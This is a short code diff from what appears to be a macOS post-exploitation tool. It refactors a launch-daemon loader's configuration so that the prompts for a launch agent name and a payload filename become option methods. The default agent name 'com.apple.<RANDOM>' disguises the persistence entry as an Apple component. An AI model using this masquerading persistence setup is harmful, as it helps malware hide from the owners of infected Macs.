@@ -13,18 +13,21 @@ class Loader(LoaderABC):
             "References": []
         }
 
-    def setup(self) -> dict:
-        launch_agent_name = input(MESSAGE_INPUT + "Launch agent name [ENTER for com.apple.<RANDOM>]: ")
+    def get_option_messages(self) -> List[str]:
+        return [
+            "Launch agent name (Leave empty for com.apple.<RANDOM>): ",
+            "Payload filename (Leave empty for <RANDOM>): "
+        ]
+
+    def get_options(self, set_options: list) -> dict:
+        launch_agent_name = set_options[0]
+        payload_filename = set_options[1]
 
         if not launch_agent_name:
             launch_agent_name = "com.apple.{}".format(random_string())
-            print(MESSAGE_INFO + "Using: {}".format(launch_agent_name))
-
-        payload_filename = input(MESSAGE_INPUT + "Payload filename [ENTER for <RANDOM>]: ")
 
         if not payload_filename:
             payload_filename = random_string()
-            print(MESSAGE_INFO + "Using: {}".format(payload_filename))
 
         return {
             "loader_name": "launch_daemon",
